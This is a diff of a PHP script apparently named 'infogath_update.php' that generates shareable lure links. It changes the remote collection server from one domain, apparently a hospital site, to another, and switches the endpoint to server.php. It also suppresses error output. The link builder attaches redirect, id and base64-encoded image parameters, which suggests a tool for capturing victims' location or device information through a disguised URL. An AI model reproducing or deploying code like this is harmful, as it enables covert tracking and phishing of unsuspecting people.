@@ -12,7 +12,7 @@
 $version 	= '1.0.2';
 $random 	= rand(123456789, 6);
 $file 		= 'infogath_update.php';
-$url 		= 'http://rsudinda.co.id/gps/';
+$url 		= 'https://www.gps.indsc.me/';
 error_reporting(0);
 
 
@@ -39,7 +39,7 @@ function buat_link($input, $random, $url, $id, $img)
 {	
 	$imgs = base64_encode($img);
 	$random2 = base64_encode($random);
-	$url = 'Copy Link => '.$url.'home.php?redirect='.$input.'&page='.$random2.'&id='.$id.'&img='.$imgs;
+	$url = 'Copy Link => '.$url.'server.php?redirect='.$input.'&page='.$random2.'&id='.$id.'&img='.$imgs;
 	echo "\n\n[+] $url";
 }
 function download($random, $url, $opt, $port)
